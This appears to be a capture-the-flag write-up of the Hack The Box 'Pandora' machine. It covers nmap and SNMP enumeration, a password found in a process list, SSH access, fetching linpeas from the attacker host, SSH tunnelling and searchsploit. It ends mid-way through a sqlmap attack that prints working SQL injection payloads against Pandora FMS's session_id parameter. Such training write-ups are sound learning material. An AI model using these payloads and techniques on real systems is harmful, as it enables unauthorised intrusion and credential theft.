  # Pandora

This is my write-up for the room Pandora


## Difficulty
My Difficulty: Medium (this box I was forced to really dig for enumeration and learn a few things that I have never done before. 

Try Hackme Difficulty: Easy

![Pandora](https://user-images.githubusercontent.com/68706090/164324434-a44c1fbd-3cfe-416b-a895-1ca624cbebd5.png)

    # Enumeration
  
  ### NMAP
  
  ```console
  noob2uub@kali:~/Documents/HTB/RouterSpace$ nmap -sC -sV -v -p 1-65535 10.10.11.148
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-18 13:59 PDT

Nmap scan report for 10.10.11.148
Host is up (0.071s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
| ssh-hostkey: 
|   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)
|   256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)
|_  256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-RouterSpace Packet Filtering V1
80/tcp open  http
|_http-favicon: Unknown favicon MD5: 5B124C159840B22F4C3D3E581C6693B9
|_http-trane-info: Problem with XML parsing of /evox/about
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-6158
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 76
|     ETag: W/"4c-3mROIBHgrB5sPHpvNoVBEYqYCNo"
|     Date: Mon, 18 Apr 2022 21:00:38 GMT
|     Connection: close
|     Suspicious activity detected !!! {RequestID: oeJ 32X ap R w bU }
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-54026
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=0
|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
|     ETag: W/"652c-17d476c9285"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 25900
|     Date: Mon, 18 Apr 2022 21:00:38 GMT
|     Connection: close
|     <!doctype html>
|     <html class="no-js" lang="zxx">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>RouterSpace</title>
|     <meta name="description" content="">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/owl.carousel.min.css">
|     <link rel="stylesheet" href="css/magnific-popup.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/themify-icons.css">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-54750
|     Allow: GET,HEAD,POST
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 13
|     ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"
|     Date: Mon, 18 Apr 2022 21:00:38 GMT
|     Connection: close
|     GET,HEAD,POST
|   RTSPRequest, X11Probe: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: RouterSpace
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.92%I=7%D=4/18%Time=625DD1B7%P=x86_64-pc-linux-gnu%r(NULL
SF:,29,"SSH-2\.0-RouterSpace\x20Packet\x20Filtering\x20V1\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.92%I=7%D=4/18%Time=625DD1B7%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,13E4,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\n
SF:X-Cdn:\x20RouterSpace-54026\r\nAccept-Ranges:\x20bytes\r\nCache-Control
SF::\x20public,\x20max-age=0\r\nLast-Modified:\x20Mon,\x2022\x20Nov\x20202
SF:1\x2011:33:57\x20GMT\r\nETag:\x20W/\"652c-17d476c9285\"\r\nContent-Type
SF::\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x2025900\r\nDate:\x
SF:20Mon,\x2018\x20Apr\x202022\x2021:00:38\x20GMT\r\nConnection:\x20close\
SF:r\n\r\n<!doctype\x20html>\n<html\x20class=\"no-js\"\x20lang=\"zxx\">\n<
SF:head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<me
SF:ta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20\x20\
SF:x20\x20<title>RouterSpace</title>\n\x20\x20\x20\x20<meta\x20name=\"desc
SF:ription\"\x20content=\"\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\
SF:x20content=\"width=device-width,\x20initial-scale=1\">\n\n\x20\x20\x20\
SF:x20<link\x20rel=\"stylesheet\"\x20href=\"css/bootstrap\.min\.css\">\n\x
SF:20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/owl\.carousel\.
SF:min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/
SF:magnific-popup\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20
SF:href=\"css/font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"st
SF:ylesheet\"\x20href=\"css/themify-icons\.css\">\n\x20")%r(HTTPOptions,10
SF:8,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX-Cdn:\x20
SF:RouterSpace-54750\r\nAllow:\x20GET,HEAD,POST\r\nContent-Type:\x20text/h
SF:tml;\x20charset=utf-8\r\nContent-Length:\x2013\r\nETag:\x20W/\"d-bMedpZ
SF:YGrVt1nR4x\+qdNZ2GqyRo\"\r\nDate:\x20Mon,\x2018\x20Apr\x202022\x2021:00
SF::38\x20GMT\r\nConnection:\x20close\r\n\r\nGET,HEAD,POST")%r(RTSPRequest
SF:,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n
SF:")%r(X11Probe,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20
SF:close\r\n\r\n")%r(FourOhFourRequest,131,"HTTP/1\.1\x20200\x20OK\r\nX-Po
SF:wered-By:\x20RouterSpace\r\nX-Cdn:\x20RouterSpace-6158\r\nContent-Type:
SF:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2076\r\nETag:\x20W/
SF:\"4c-3mROIBHgrB5sPHpvNoVBEYqYCNo\"\r\nDate:\x20Mon,\x2018\x20Apr\x20202
SF:2\x2021:00:38\x20GMT\r\nConnection:\x20close\r\n\r\nSuspicious\x20activ
SF:ity\x20detected\x20!!!\x20{RequestID:\x20oeJ\x20\x20\x2032X\x20ap\x20R\
SF:x20\x20\x20w\x20bU\x20\x20}\n\n\n\n\n\n\n");

NSE: Script Post-scanning.
Initiating NSE at 14:01
Completed NSE at 14:01, 0.00s elapsed
Initiating NSE at 14:01
Completed NSE at 14:01, 0.00s elapsed
Initiating NSE at 14:01
Completed NSE at 14:01, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.28 seconds
```
I couldn't find anything here so I started a UDP scan and found that port 161 was open

```Console
noob2uub@kali:~/Documents/HTB/Pandor$ sudo nmap -sC -sV -sU -A -v 10.10.11.136
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-18 16:13 PDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:13
Completed NSE at 16:13, 0.00s elapsed
Initiating NSE at 16:13
Completed NSE at 16:13, 0.00s elapsed
Initiating NSE at 16:13
Completed NSE at 16:13, 0.00s elapsed
Initiating Ping Scan at 16:13
Scanning 10.10.11.136 [4 ports]
Completed Ping Scan at 16:13, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:13
Completed Parallel DNS resolution of 1 host. at 16:13, 0.00s elapsed
Initiating UDP Scan at 16:13
Scanning 10.10.11.136 [1000 ports]
Discovered open port 161/udp on 10.10.11.136
```

### SNMP Check

So I decided to run an SNMP sheck since that is what port 161 is for.

```console
noob2uub@kali:~/Documents/HTB/Pandor$ snmp-check 10.10.11.136 -c public
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.11.136:161 using SNMPv1 and community 'public'

  [*] System information:

  Host IP address               : 10.10.11.136
  Hostname                      : pandora
  Description                   : Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
  Contact                       : Daniel
  Location                      : Mississippi
  Uptime snmp                   : 11:35:26.05
  Uptime system                 : 11:35:15.66
  System date                   : 2022-4-18 23:16:55.0

[*] Network information:

  IP forwarding enabled         : no
  Default TTL                   : 64noob2uub@kali:~/Documents/HTB/Pandor$ snmp-check 10.10.11.136 -c public
  TCP segments received         : 436542
  TCP segments sent             : 503890
  TCP segments retrans          : 29073
  Input datagrams               : 489199
  Delivered datagrams           : 481262
  Output datagrams              : 507508

[*] Network interfaces:

  Interface                     : [ up ] lo
  Id                            : 1
  Mac Address                   : :::::
  Type                          : softwareLoopback
  Speed                         : 10 Mbps
  MTU                           : 65536
  In octets                     : 14115727
  Out octets                    : 14115727

  Interface                     : [ up ] VMware VMXNET3 Ethernet Controller
  Id                            : 2
  Mac Address                   : 00:50:56:b9:b0:fb
  Type                          : ethernet-csmacd
  Speed                         : 4294 Mbps
  MTU                           : 1500
  In octets                     : 36946465
  Out octets                    : 259298475


[*] Network IP:

  Id                    IP Address            Netmask               Broadcast           
  2                     10.10.11.136          255.255.254.0         1                   
  1                     127.0.0.1             255.0.0.0             0                   

[*] Routing information:

  Destination           Next hop              Mask                  Metric              
  0.0.0.0               10.10.10.2            0.0.0.0               1                   
  10.10.10.0            0.0.0.0               255.255.254.0         0                   

[*] TCP connections and listening ports:

  Local address         Local port            Remote address        Remote port           State               
  0.0.0.0               22                    0.0.0.0               0                     listen              
  10.10.11.136          41460                 10.10.14.18           4444                  established         
  10.10.11.136          41838                 10.10.14.18           4444                  established         
  10.10.11.136          46312                 1.1.1.1               53                    synSent             
  10.10.11.136          58698                 10.10.16.10           9090                  closeWait           
  10.10.11.136          58868                 10.10.16.10           9090                  closeWait           
  10.10.11.136          58890                 10.10.16.10           9090                  closeWait           
  10.10.11.136          59258                 10.10.16.10           9090                  closeWait           
  10.10.11.136          59310                 10.10.16.10           9090                  closeWait           
  10.10.11.136          59456                 10.10.16.10           9090                  closeWait           
  10.10.11.136          59548                 10.10.16.10           9090                  closeWait           
  10.10.11.136          59698                 10.10.16.10           9090                  closeWait           
  10.10.11.136          60144                 10.10.16.10           9090                  closeWait           
  127.0.0.1             3306                  0.0.0.0               0                     listen              
  127.0.0.53            53                    0.0.0.0               0                     listen              

[*] Listening UDP ports:

  Local address         Local port          
  0.0.0.0               161                 
  127.0.0.53            53                  

[*] Processes:
```

There was much more information processed but scaning through it I found credentials. 

```console
  1134                  runnable              host_check            /usr/bin/host_check   -u daniel -p HotelBabylon23
```

Now that we have credentials lets see what we can do with SSH. 

### SSH 

```console
noob2uub@kali:~/Documents/HTB/Pandor$ ssh daniel@10.10.11.136
The authenticity of host '10.10.11.136 (10.10.11.136)' can't be established.
ECDSA key fingerprint is SHA256:9urFJN3aRYRRc9S5Zc+py/w4W6hmZ+WLg6CyrY+5MDI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.10.11.136' (ECDSA) to the list of known hosts.
daniel@10.10.11.136's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 20 Apr 15:55:48 UTC 2022

  System load:           0.1
  Usage of /:            63.0% of 4.87GB
  Memory usage:          7%
  Swap usage:            0%
  Processes:             223
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.136
  IPv6 address for eth0: dead:beef::250:56ff:feb9:ca19

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

daniel@pandora:~$ 
```

Nice we now have access to Daniels account. 

After digging around we find Matts user account and the user flag. However, Daniel can not access it.

```console
daniel@pandora:~$ ls -la
total 28
drwxr-xr-x 4 daniel daniel 4096 Apr 20 15:55 .
drwxr-xr-x 4 root   root   4096 Dec  7 14:32 ..
lrwxrwxrwx 1 daniel daniel    9 Jun 11  2021 .bash_history -> /dev/null
-rw-r--r-- 1 daniel daniel  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 daniel daniel 3771 Feb 25  2020 .bashrc
drwx------ 2 daniel daniel 4096 Apr 20 15:55 .cache
-rw-r--r-- 1 daniel daniel  807 Feb 25  2020 .profile
drwx------ 2 daniel daniel 4096 Dec  7 14:32 .ssh
daniel@pandora:~$ cd ..
daniel@pandora:/home$ ls
daniel  matt
daniel@pandora:/home$ cd matt
daniel@pandora:/home/matt$ ls
user.txt
daniel@pandora:/home/matt$ cat user.txt
cat: user.txt: Permission denied
daniel@pandora:/home/matt$ 
```

Lets put Linpeas on the victim machine and see what we find.

### HTTP Server
```console
noob2uub@kali:~/Documents/Tools$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.136 - - [20/Apr/2022 09:42:06] "GET /linpeas.sh HTTP/1.1" 200 -
```
### WGET to transfer Linpeas
```console
daniel@pandora:~$ wget 10.10.14.49:8000/linpeas.sh
--2022-04-20 16:41:04--  http://10.10.14.49:8000/linpeas.sh
Connecting to 10.10.14.49:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 765823 (748K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                           100%[====================================================================================================================>] 747.87K  1.72MB/s    in 0.4s    

2022-04-20 16:41:04 (1.72 MB/s) - ‘linpeas.sh’ saved [765823/765823]

daniel@pandora:~$ chmod -x .linpeas.sh
chmod: cannot access '.linpeas.sh': No such file or directory
daniel@pandora:~$ chmod -x linpeas.sh
daniel@pandora:~$ ./linpeas.sh
-bash: ./linpeas.sh: Permission denied
daniel@pandora:~$ chmod 777 linpeas.sh
daniel@pandora:~$ ./linpeas.sh
```


```console
drwxr-xr-x 2 root root 4096 Dec  3 12:57 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Dec  3 12:56 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
lrwxrwxrwx 1 root root 31 Dec  3 12:53 cdsites-enabled/pandora.conf -> ../sites-available/pandora.conf
  ServerName pandora.panda.htb
```
Looks like Matt can run this if we can get access to his account

```console

                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
strings Not Found
-rwsr-xr-x 1 root root 163K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 31K May 26  2021 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 84K Jul 14  2021 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Jul 14  2021 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 87K Jul 14  2021 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Jul 21  2020 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-x--- 1 root matt 17K Dec  3 15:58 /usr/bin/pandora_backup (Unknown SUID binary)
-rwsr-xr-x 1 root root 67K Jul 14  2021 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 55K Jul 21  2020 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 67K Jul 21  2020 /usr/bin/su
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 52K Jul 14  2021 /usr/bin/chsh
-rwsr-xr-x 1 root root 463K Jul 23  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 23K May 26  2021 /usr/lib/policykit-1/polkit-agent-helper-1
```
Taking a look at the available sites and pandora.conf we find some interesting information hosted on localhost:80

```console
daniel@pandora:/etc/apache2$ ls
apache2.conf  conf-available  conf-enabled  envvars  magic  mods-available  mods-enabled  ports.conf  sites-available  sites-enabled
daniel@pandora:/etc/apache2$ cd sites-available/
daniel@pandora:/etc/apache2/sites-available$ ls
000-default.conf  default-ssl.conf  pandora.conf
daniel@pandora:/etc/apache2/sites-available$ cat pandora.conf
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```
Lets now take a look at the /var/www/pandora folder

```console
daniel@pandora:/var/www$ ls
html  pandora
daniel@pandora:/var/www$ cd pandora/
daniel@pandora:/var/www/pandora$ ls
index.html  pandora_console
daniel@pandora:/var/www/pandora$ cd pandora_console/
daniel@pandora:/var/www/pandora/pandora_console$ ls
ajax.php    composer.json  DEBIAN                extras   images        mobile                            pandora_console_logrotate_suse    pandoradb.sql                     vendor
attachment  composer.lock  docker_entrypoint.sh  fonts    include       operation                         pandora_console_logrotate_ubuntu  pandora_websocket_engine.service  ws.php
audit.log   COPYING        Dockerfile            general  index.php     pandora_console.log               pandora_console_upgrade           tests
AUTHORS     DB_Dockerfile  extensions            godmode  install.done  pandora_console_logrotate_centos  pandoradb_data.sql                tools
daniel@pandora:/var/www/pandora/pandora_console$ 
```

we see that the content is in pandora console


We know that there is a webserver running and we can see the server is pandora.panda.htp and its running on localhost, lets take a look at the host fist.

```console
daniel@pandora:/etc$ cat hosts
127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb
127.0.1.1 pandora

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
### SSH Tunneling to access Local Host site

```console
noob2uub@kali:~$ ssh -L 8080:127.0.0.1:80 daniel@10.10.11.136
daniel@10.10.11.136's password: 
Permission denied, please try again.
daniel@10.10.11.136's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 20 Apr 17:34:56 UTC 2022

  System load:           0.0
  Usage of /:            63.0% of 4.87GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             223
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.136
  IPv6 address for eth0: dead:beef::250:56ff:feb9:ca19

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Apr 20 17:32:16 2022 from 127.0.0.1

```

We should now beable to access localhost.localdomain from our machine, but that did not bring anything up so lets try localhost.localdomain/pandora_console and we see that its running an FMS site.

![Screenshot_2022-04-20_10-41-55](https://user-images.githubusercontent.com/68706090/164290551-bde10855-9663-401a-a897-d83ce48693a8.png)

### Searchsploit

```console
noob2uub@kali:~$ searchsploit pandora 7.0
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Pandora 7.0NG - Remote Code Execution                                                                                                                                           | php/webapps/47898.py
Pandora FMS 7.0 NG 749 - 'CG Items' SQL Injection (Authenticated)                                                                                                               | php/webapps/49046.txt
Pandora FMS 7.0 NG 749 - Multiple Persistent Cross-Site Scripting Vulnerabilities                                                                                               | php/webapps/49139.txt
Pandora FMS 7.0 NG 750 - 'Network Scan' SQL Injection (Authenticated)                                                                                                           | php/webapps/49312.txt
Pandora FMS 7.0NG - 'net_tools.php' Remote Code Execution                                                                                                                       | php/webapps/48280.py
PANDORAFMS 7.0 - Authenticated Remote Code Execution                                                                                                                            | php/webapps/48064.py
PandoraFMS 7.0 NG 746 - Persistent Cross-Site Scripting                                                                                                                         | php/webapps/48707.txt
PandoraFMS NG747 7.0 - 'filename' Persistent Cross-Site Scripting                                                                                                               | php/webapps/48700.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The SQL injection looks promising, this link explains allot
https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained

### SQL MAP

```console
noob2uub@kali:~$ sqlmap -u http://localhost:8080/pandora_console/include/chart_generator.php?session_id=* -D pandora --tables
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:28:51 /2022-04-20/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[11:28:54] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
[11:28:54] [INFO] resuming back-end DBMS 'mysql' 
[11:28:54] [INFO] testing connection to the target URL
[11:28:54] [WARNING] potential permission problems detected ('Access denied')
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=qujvpae50d4...ujj0rpdggr'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: http://localhost:8080/pandora_console/include/chart_generator.php?session_id=-9377' OR 3978=3978#

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: http://localhost:8080/pandora_console/include/chart_generator.php?session_id=' OR (SELECT 2785 FROM(SELECT COUNT(*),CONCAT(0x71706a7871,(SELECT (ELT(2785=2785,1))),0x71626b7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BkTO

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://localhost:8080/pandora_console/include/chart_generator.php?session_id=' AND (SELECT 2966 FROM (SELECT(SLEEP(5)))dvHA)-- Najw
---
[11:28:58] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
web application technology: PHP, Apache 2.4.41
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[11:28:58] [INFO] fetching tables for database: 'pandora'
[11:28:58] [WARNING] reflective value(s) found and filtering out
[11:28:58] [INFO] retrieved: 'tvisual_console_elements_cache'
[11:28:58] [INFO] retrieved: 'tservice_element'
[11:28:58] [INFO] retrieved: 'tuser_double_auth'
[11:28:58] [INFO] retrieved: 'tagent_custom_data'
[11:28:58] [INFO] retrieved: 'treport_content_sla_combined'
[11:28:58] [INFO] retrieved: 'ttransaction'
[11:28:59] [INFO] retrieved: 'tskin'
[11:28:59] [INFO] retrieved: 'ttipo_modulo'
[11:28:59] [INFO] retrieved: 'tserver'
[11:28:59] [INFO] retrieved: 'tlayout_template_data'
[11:28:59] [INFO] retrieved: 'tnetworkmap_ent_rel_nodes'
[11:28:59] [INFO] retrieved: 'tlog_graph_models'
[11:28:59] [INFO] retrieved: 'twidget_dashboard'
[11:28:59] [INFO] retrieved: 'tnetwork_component_group'
[11:28:59] [INFO] retrieved: 'tnotification_source_group'
[11:28:59] [INFO] retrieved: 'tpolicy_modules'
[11:28:59] [INFO] retrieved: 'tupdate_journal'
[11:29:00] [INFO] retrieved: 'tevent_alert'
[11:29:00] [INFO] retrieved: 'talert_actions'
[11:29:00] [INFO] retrieved: 'tuser_task'
[11:29:00] [INFO] retrieved: 'tfiles_repo'
[11:29:00] [INFO] retrieved: 'tgis_map_layer_has_tagente'
[11:29:00] [INFO] retrieved: 'tplugin'
[11:29:00] [INFO] retrieved: 'tagent_access'
[11:29:00] [INFO] retrieved: 'tupdate_settings'
[11:29:00] [INFO] retrieved: 'talert_commands'
[11:29:00] [INFO] retrieved: 'tagent_module_log'
[11:29:00] [INFO] retrieved: 'tnetflow_report'
[11:29:01] [INFO] retrieved: 'tmodule_inventory'
[11:29:01] [INFO] retrieved: 'tconfig_os'
[11:29:01] [INFO] retrieved: 'tevent_filter'
[11:29:01] [INFO] retrieved: 'tpolicy_alerts'
[11:29:01] [INFO] retrieved: 'ttrap_custom_values'
[11:29:01] [INFO] retrieved: 'tagente_datos_inventory'
[11:29:01] [INFO] retrieved: 'treset_pass_history'
[11:29:01] [INFO] retrieved: 'tcategory'
[11:29:01] [INFO] retrieved: 'tgis_map_layer_groups'
[11:29:01] [INFO] retrieved: 'tgis_data_status'
[11:29:01] [INFO] retrieved: 'tmensajes'
[11:29:02] [INFO] retrieved: 'tmap'
[11:29:02] [INFO] retrieved: 'treport_content_item_temp'
[11:29:02] [INFO] retrieved: 'tprofile_view'
[11:29:02] [INFO] retrieved: 'ttrap'
[11:29:02] [INFO] retrieved: 'torigen'
[11:29:02] [INFO] retrieved: 'tnotification_source_group_user'
[11:29:02] [INFO] retrieved: 'tcollection'
[11:29:02] [INFO] retrieved: 'treport_template'
[11:29:02] [INFO] retrieved: 'tnotification_source_user'
[11:29:02] [INFO] retrieved: 'tpassword_history'
[11:29:02] [INFO] retrieved: 'tgroup_stat'
[11:29:03] [INFO] retrieved: 'textension_translate_string'
[11:29:03] [INFO] retrieved: 'tgraph_source'
[11:29:03] [INFO] retrieved: 'tplanned_downtime'
[11:29:03] [INFO] retrieved: 'tagente_estado'
[11:29:03] [INFO] retrieved: 'tevent_rule'
[11:29:03] [INFO] retrieved: 'tmetaconsole_agent'
[11:29:03] [INFO] retrieved: 'tagente_datos_string'
[11:29:03] [INFO] retrieved: 'tgis_map'
[11:29:03] [INFO] retrieved: 'tgis_map_connection'
[11:29:03] [INFO] retrieved: 'tgraph_source_template'
[11:29:03] [INFO] retrieved: 'tnotification_group'
[11:29:04] [INFO] retrieved: 'tlayout_template'
[11:29:04] [INFO] retrieved: 'tprovisioning'
[11:29:04] [INFO] retrieved: 'taddress'
[11:29:04] [INFO] retrieved: 'tcluster'
[11:29:04] [INFO] retrieved: 'tnetwork_profile'
[11:29:04] [INFO] retrieved: 'talert_template_modules'
[11:29:04] [INFO] retrieved: 'tgraph_template'
[11:29:04] [INFO] retrieved: 'tgis_data_history'
[11:29:04] [INFO] retrieved: 'trecon_script'
[11:29:04] [INFO] retrieved: 'treport_content_item'
[11:29:04] [INFO] retrieved: 'tgis_map_has_tgis_map_con'
[11:29:05] [INFO] retrieved: 'treport_content'
[11:29:05] [INFO] retrieved: 'tmigration_module_queue'
[11:29:05] [INFO] retrieved: 'tevent_alert_action'
[11:29:05] [INFO] retrieved: 'treport_custom_sql'
[11:29:05] [INFO] retrieved: 'tattachment'
[11:29:05] [INFO] retrieved: 'tnotification_user'
[11:29:05] [INFO] retrieved: 'tsessions_php'
[11:29:05] [INFO] retrieved: 'tagente_datos_inc'
[11:29:05] [INFO] retrieved: 'tphase'
[11:29:05] [INFO] retrieved: 'talert_template_module_actions'
[11:29:05] [INFO] retrieved: 'tplanned_downtime_agents'
[11:29:06] [INFO] retrieved: 'tserver_export'
[11:29:06] [INFO] retrieved: 'talert_snmp_action'
[11:29:06] [INFO] retrieved: 'treset_pass'
[11:29:06] [INFO] retrieved: 'tusuario'
[11:29:06] [INFO] retrieved: 'tremote_command'
[11:29:06] [INFO] retrieved: 'tagent_repository'
[11:29:06] [INFO] retrieved: 'tmetaconsole_agent_secondary_group'
[11:29:06] [INFO] retrieved: 'tagent_custom_fields'
[11:29:06] [INFO] retrieved: 'tnetworkmap_enterprise_nodes'
[11:29:06] [INFO] retrieved: 'talert_snmp'
[11:29:06] [INFO] retrieved: 'tsesion_extended'
[11:29:07] [INFO] retrieved: 'tlayout'
